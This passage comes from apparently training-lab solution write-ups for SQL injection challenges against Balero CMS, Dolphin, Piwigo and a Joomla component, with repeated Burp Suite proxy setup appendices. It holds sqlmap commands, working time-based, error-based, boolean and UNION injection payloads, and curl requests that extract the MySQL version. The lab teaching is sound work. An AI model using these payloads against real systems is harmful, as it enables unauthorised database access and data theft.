 
 
 
The MySQL server version was revealed. 
 
References:  
 
1.
PHP Ticket System (​https://sourceforge.net/projects/phpticketsystem/  
2.
PHP Ticket System Beta 1 - 'get_all_created_by_user.php?id' SQL Injection 
(​https://www.exploit-db.com/exploits/31971​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
Name 
Balero CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=272  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “balero cms sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains an HTML form which can be used to exploit the SQL injection 
vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36675 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application. 
 
Click on the “Administrator Panel” hyperlink  
 
 
 
 
 
 
 
 
 
 
 
 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password 
 
 
 
Step 4: ​Analysis of the HTML form’s text fields reveals that the “id” parameter is vulnerable. The 
action of the HTML form contains the string “edit_page/mod-virtual_page”, which as the name 
suggests is the URL for editing “Virtual Pages”. Create a “Virtual Page” which can be later used 
to exploit the vulnerability.  
 
Click on “Virtual Pages” option in the left panel. 
 
 
 
Enter value “test” in the title and content textbox. Scroll down and click on the “Create” Button. 
 
 
 
 
 
 
The “virtual page” was created successfully. 
 
Step 5: ​Edit the “Virtual Page” and intercept the request with burp suite. 
 
Click on the “Virtual Pages” option on the left panel and scroll down. 
 
 
 
 
 
 
 
Click on the newly created virtual page “test”. 
 
 
 
Click on the “Edit” button and intercept the request with burp suite. 
 
Check Appendix to learn how to configure Burp Suite. 
 
Intercepted Request: 
 
 
 
 
 
 
 
 
 
 
 
 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Step 6: ​Find the payload using sqlmap. 
 
Vulnerable parameter:​  id 
 
 
Command: ​sqlmap -r request -p id 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
Payload: ​virtual_title=test&a=1&content=<p>test</p>&files=&id=2' AND SLEEP(5) AND 
'Jidv'='Jidv&submit= 
 
Step 7: ​Send the intercepted request to Repeater. 
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
Repeater Tab: 
 
 
 
Step 8: ​Send the original request and check the response time. 
 
Request section in the Repeater tab. 
 
 
 
 
Response section in the Repeater tab. 
 
 
 
It took 244 ms to receive the response. (The time is displayed on the right bottom corner) 
 
 
Step 9: ​Inject the time based payload in POST data and check the response time.  
 
Before: ​virtual_title=test&a=1&content=%3Cp%3Etest%3C%2Fp%3E&files=&id=2&submit= 
 
After: ​virtual_title=test&a=1&content=<p>test</p>&files=&id=2' AND SLEEP(5) AND 
'Jidv'='Jidv&submit= 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
The injected time based SQLI payload was executed and the response was received with 5 
second delay. 
 
 
 
 
Step 10: ​Increase the sleep time in payload to 10 and check the response time. 
 
Before: ​virtual_title=test&a=1&content=<p>test</p>&files=&id=2' AND SLEEP(5) AND 
'Jidv'='Jidv&submit= 
 
After: ​virtual_title=test&a=1&content=<p>test</p>&files=&id=2' AND SLEEP(10) AND 
'Jidv'='Jidv&submit= 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
The response was received with 10 second delay.  
 
 
 
References:  
 
1.
Balero CMS (​https://sourceforge.net/projects/balerocms/​) 
 
2.
Balero CMS 0.7.2 - Multiple Blind SQL Injections 
(​https://www.exploit-db.com/exploits/36675​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Dolphin 
URL 
https://www.attackdefense.com/challengedetails?cid=265  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Dolphin sql injection” and look for publically available exploits.  
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40403 
 
 
 
 
 
 
 
 
 
Step 3: ​Find the SQLI Payload using sqlmap. The vulnerable parameter and webpage 
information is given on the exploit db link.  
 
Vulnerable web page: ​/flash/XML.php 
 
Vulnerable parameter:​ key 
 
Command: ​sqlmap -u 
"pjswivplfvkkz8ddeismodm5d.public1.attackdefenselabs.com/flash/XML.php?module=chat&acti
on=RayzSetMembershipSetting&id=1&_t=41920&key=12" -p key 
 
 
 
 
Enter the following answers for the questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“y” for “Do you want to try with a random integer value for option '--union-char'?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
Error based payload: 
module=chat&action=RayzSetMembershipSetting&id=1&_t=41920&key=12%27%20AND%20(S
ELECT%205929%20FROM(SELECT%20COUNT(*),CONCAT(0x7176626b71,(SELECT%20(E
LT(5929=5929,1))),0x716b6a7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCH
EMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27NiIU%27=%27NiIU  
 
Step 4: ​Using the SQLI payload obtained in previous step, form the URL required to exploit the 
vulnerability.  
 
URL: 
http://pjswivplfvkkz8ddeismodm5d.public1.attackdefenselabs.com/flash/XML.php?module=chat
&action=RayzSetMembershipSetting&id=1&_t=41920&key=12%27%20AND%20(SELECT%20
5929%20FROM(SELECT%20COUNT(*),CONCAT(0x7176626b71,(SELECT%20(ELT(5929=59
29,1))),0x716b6a7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGI
NS%20GROUP%20BY%20x)a)%20AND%20%27NiIU%27=%27NiIU 
 
Step 5: ​Send HTTP GET request to the above URL using curl command 
 
Command: ​curl 
"http://pjswivplfvkkz8ddeismodm5d.public1.attackdefenselabs.com/flash/XML.php?module=chat
&action=RayzSetMembershipSetting&id=1&_t=41920&key=12%27%20AND%20(SELECT%20
5929%20FROM(SELECT%20COUNT(*),CONCAT(0x7176626b71,(SELECT%20(ELT(5929=59
29,1))),0x716b6a7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGI
NS%20GROUP%20BY%20x)a)%20AND%20%27NiIU%27=%27NiIU" 
 
 
 
 
 
 
 
The injected SQLI Payload was executed.  
 
Step 6: ​Modify the URL used in previous step to retrieve the MySQL server version information.  
 
Modified URL: 
http://pjswivplfvkkz8ddeismodm5d.public1.attackdefenselabs.com/flash/XML.php?module=chat
&action=RayzSetMembershipSetting&id=1&_t=41920&key=12%27%20AND%20(SELECT%20
5929%20FROM(SELECT%20COUNT(*),CONCAT(version(),(SELECT%20(ELT(5929=5929,1))
),0x716b6a7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%2
0GROUP%20BY%20x)a)%20AND%20%27NiIU%27=%27NiIU 
 
Command: ​curl 
"http://pjswivplfvkkz8ddeismodm5d.public1.attackdefenselabs.com/flash/XML.php?module=chat
&action=RayzSetMembershipSetting&id=1&_t=41920&key=12%27%20AND%20(SELECT%20
5929%20FROM(SELECT%20COUNT(*),CONCAT(version(),(SELECT%20(ELT(5929=5929,1))
),0x716b6a7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%2
0GROUP%20BY%20x)a)%20AND%20%27NiIU%27=%27NiIU" 
 
 
 
The MySQL server version is revealed.  
 
 
References:  
 
1.
Dolphin (​https://www.boonex.com/n/dolphin-7-3-2​)  
2.
Dolphin 7.3.0 - Error-Based SQL Injection (​https://www.exploit-db.com/exploits/40403​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
Name 
Piwigo 
URL 
https://www.attackdefense.com/challengedetails?cid=266  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Piwigo sql injection” and look for publically available exploits.  
 
 
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/43337 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application.  
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password 
 
Dashboard:  
 
 
 
Step 4: ​Access the administrative panel from the “Administration” option provided on the left 
panel and create an album. 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the “manage” option under “Albums” tab on the left panel. 
 
 
 
 
 
Click on the “create a new album” link and enter the name of the album, (“test” in this case). 
 
 
 
Click on the Create button. 
 
 
 
The album was added successfully.  
  
Step 5: ​Navigate to the URL provided at exploit db link. Interact with the web page and intercept 
the POST request which contains “cat_false[]” parameter.  
 
URL: 
http://w7anzrgmd9o56iu1x86xr7du4.public2.attackdefenselabs.com/piwigo/admin.php?page=ca
t_options&section=status 
 
 
 
Select “test” album, click “>>” button and intercept the request with burp suite.  
 
Check Appendix to learn how to configure Burp Suite. 
 
 
 
 
 
 
 
 
 
 
 
 
Intercepted Request: 
 
 
 
 
 
 
The intercepted request does not contain “cat_false[]” parameter. Forward the request.  
 
 
 
The “test” album was moved to the private section. 
 
 Select “test” album, click on the “<<” button and intercept the request with burp suite.  
 
 
 
 
 
 
The intercepted request contains the “cat_false[]” parameter. 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Turn off the intercept in burp suite.  
 
Step 6: ​Find the payload using sqlmap. 
 
Vulnerable parameter:​  cat_false[] 
 
Command: ​sqlmap -r request -p cat_false[] 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
 
 
 
 
Payloads:  
 
Type: ​boolean-based blind 
Payload: ​cat_false[]=1) AND 7913=7913 AND (7910=7910&trueify=%C2%AB 
 
Type: ​error-based 
Payload: ​cat_false[]=1) AND (SELECT 5620 FROM(SELECT 
COUNT(*),CONCAT(0x716a786a71,(SELECT 
(ELT(5620=5620,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (9592=9592&trueify=%C2%AB 
 
Type: ​AND/OR time-based blind 
Payload: ​cat_false[]=1) AND SLEEP(5) AND (6059=6059&trueify=%C2%AB 
 
Type: ​UNION query 
Payload: ​cat_false[]=1) UNION ALL SELECT 
CONCAT(0x716a786a71,0x47596770647546554f484f524342516c6e6f617466515341487a694
86c51524d69776656795a726e,0x716a626b71)-- eIPk&trueify=%C2%AB 
 
Step 7: ​Send the intercepted request to Repeater. 
 
Payload:  
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
 
 
 
 
 
 
Repeater Tab: 
 
 
 
 
 
 
 
Step 8: ​Inject the error based SQLI payload in the POST data of the request and exploit the 
vulnerability.  
 
Before: ​cat_true%5B%5D=2&falsify=%C2%BB 
 
After: ​cat_false[]=1) AND (SELECT 5620 FROM(SELECT 
COUNT(*),CONCAT(0x716a786a71,(SELECT 
(ELT(5620=5620,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (9592=9592&trueify=%C2%AB 
 
Request section in the Repeater tab: 
 
 
 
 
 
 
 
Response section in the Repeater tab: 
 
 
 
The injected SQLI payload was executed.  
 
Step 9: ​Modify the payload used in previous step and retrieve the MySQL server version 
information. 
 
Before: ​cat_false[]=1) AND (SELECT 5620 FROM(SELECT 
COUNT(*),CONCAT(0x716a786a71,(SELECT 
(ELT(5620=5620,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (9592=9592&trueify=%C2%AB 
 
 
 
 
 
After:  
cat_false[]=1) AND (SELECT 5620 FROM(SELECT COUNT(*),CONCAT(version(),(SELECT 
(ELT(5620=5620,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (9592=9592&trueify=%C2%AB 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab. 
 
 
 
 
 
 
 
 
 
 
The MySQL Server version information is revealed. 
 
References:  
 
1.
Piwigo (​https://piwigo.org/​) 
 
2.
Piwigo 2.9.1 - 'cat_true' / 'cat_false' SQL Injection 
(​https://www.exploit-db.com/exploits/43337​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Joomla Prayer Center Component 
URL 
https://www.attackdefense.com/challengedetails?cid=267  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “joomla prayercenter component sql injection exploit db” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44160 
 
 
 
 
 
 
 
 
Step 3: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
Payload: 
%31%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%32
%32%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%28%53%45%4c%45%43%54%
20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%74%61%62%6c%65%5f%6e%61
%6d%65%20%53%45%50%41%52%41%54%4f%52%20%30%78%33%63%36%32%37%32
%33%65%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%5
3%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%54%41
%42%4c%45%5f%53%43%48%45%4d%41%3d%44%41%54%41%42%41%53%45%28%29
%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29
%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%56%65%72
%41%79%61%72%69 
 
 
 
URL: 
http://e921wleuf65ox8uffmzliq0ri.public2.attackdefenselabs.com/index.php?option=com_prayerc
enter&task=confirm&id=1&sessionid=%31%27%20%41%4e%44%20%45%58%54%52%41%4
3%54%56%41%4c%55%45%28%32%32%2c%43%4f%4e%43%41%54%28%30%78%35%63
%2c%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%2
8%74%61%62%6c%65%5f%6e%61%6d%65%20%53%45%50%41%52%41%54%4f%52%20
